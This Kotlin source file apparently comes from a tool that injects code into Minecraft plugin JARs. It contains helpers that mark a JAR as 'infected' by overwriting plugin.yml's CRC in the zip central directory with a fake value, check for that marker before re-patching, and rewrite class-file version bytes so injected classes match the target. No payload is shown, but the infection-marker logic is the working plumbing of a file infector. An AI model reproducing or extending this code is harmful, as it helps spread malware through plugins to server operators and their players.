package com.tmquan2508.inject.utils

import com.tmquan2508.inject.cli.Logs
import java.io.IOException
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardOpenOption
import java.util.Enumeration
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipFile

data class JavaVersion(val major: Int, val minor: Int = 0)

private const val FAKE_MARKER_STRING = "openbd.injected"
private const val CENTRAL_DIR_SIGNATURE: Int = 0x02014b50
private const val EOCD_SIGNATURE: Int = 0x06054b50

private fun calculateFakeCRC(): Long {
    val crc = CRC32()
    crc.update(FAKE_MARKER_STRING.toByteArray(StandardCharsets.UTF_8))
    return crc.value
}

fun isAlreadyPatched(jarPath: Path): Boolean {
    try {
        ZipFile(jarPath.toFile()).use { zipFile ->
            val entry = zipFile.getEntry("plugin.yml") ?: return false
            if (entry.crc == calculateFakeCRC()) {
                Logs.debug("[PatchCheck] Plugin already patched (marker found).")
                return true
            }
        }
    } catch (e: IOException) {
        Logs.warn("[PatchCheck] Could not check for fake CRC marker: ${e.message}")
    }
    return false
}

fun setInfectionMarkerOnTarget(targetJarPath: Path) {
    try {
        Logs.debug(" -> Setting infection marker by faking plugin.yml CRC...")
        val bytes = Files.readAllBytes(targetJarPath)
        val eocdOffset = findEOCDOffset(bytes)
        if (eocdOffset == -1) {
            throw IOException("EOCD record not found in JAR")
        }

        val centralDirOffset = bytes.getIntLE(eocdOffset + 16)
        var currentOffset = centralDirOffset

        while (bytes.getIntLE(currentOffset) == CENTRAL_DIR_SIGNATURE) {
            val fileNameLength = bytes.getShortLE(currentOffset + 28)
            val filename = String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8)

            if ("plugin.yml" == filename) {
                val crcOffset = currentOffset + 16
                bytes.putIntLE(crcOffset, calculateFakeCRC().toInt())
                Files.write(targetJarPath, bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)
                Logs.debug(" -> Fake CRC marker set successfully on plugin.yml.")
                return
            }

            val extraFieldLength = bytes.getShortLE(currentOffset + 30)
            val fileCommentLength = bytes.getShortLE(currentOffset + 32)
            currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength
        }
        throw IOException("plugin.yml not found in central directory")
    } catch (e: Exception) {
        throw IOException("Failed to set fake marker on ${targetJarPath.fileName}", e)
    }
}

fun findDominantJavaVersion(jarPath: Path): JavaVersion {
    val counts = mutableMapOf<JavaVersion, Int>()
    try {
        ZipFile(jarPath.toFile()).use { zipFile ->
            val entries: Enumeration<out ZipEntry> = zipFile.entries()
            while (entries.hasMoreElements()) {
                val entry = entries.nextElement()
                if (entry.name.endsWith(".class")) {
                    zipFile.getInputStream(entry).use { inStream ->
                        val header = ByteArray(8)
                        if (inStream.read(header) == 8 && ByteBuffer.wrap(header, 0, 4).int == 0xCAFEBABE.toInt()) {
                            val minor = ByteBuffer.wrap(header, 4, 2).short.toInt() and 0xFFFF
                            val major = ByteBuffer.wrap(header, 6, 2).short.toInt() and 0xFFFF
                            val version = JavaVersion(major, minor)
                            counts[version] = counts.getOrDefault(version, 0) + 1
                        }
                    }
                }
            }
        }
    } catch (e: IOException) {
        Logs.warn("[Patcher] Could not scan for class versions: ${e.message}. Defaulting to Java 8.")
        return JavaVersion(52)
    }

    return counts.entries.maxByOrNull { it.value }?.key ?: JavaVersion(52)
}

fun setClassVersion(classBytes: ByteArray, newVersion: JavaVersion) {
    if (classBytes.size < 8) return

    classBytes[4] = (newVersion.minor shr 8).toByte()
    classBytes[5] = newVersion.minor.toByte()
    classBytes[6] = (newVersion.major shr 8).toByte()
    classBytes[7] = newVersion.major.toByte()
}

private fun findEOCDOffset(bytes: ByteArray): Int {
    for (i in bytes.size - 22 downTo 0) {
        if (bytes.getIntLE(i) == EOCD_SIGNATURE) {
            return i
        }
    }
    return -1
}

private fun ByteArray.getIntLE(offset: Int): Int =
    ByteBuffer.wrap(this, offset, 4).order(ByteOrder.LITTLE_ENDIAN).int

private fun ByteArray.getShortLE(offset: Int): Int =
    ByteBuffer.wrap(this, offset, 2).order(ByteOrder.LITTLE_ENDIAN).short.toInt() and 0xFFFF

private fun ByteArray.putIntLE(offset: Int, value: Int) {
    ByteBuffer.wrap(this, offset, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(value)
}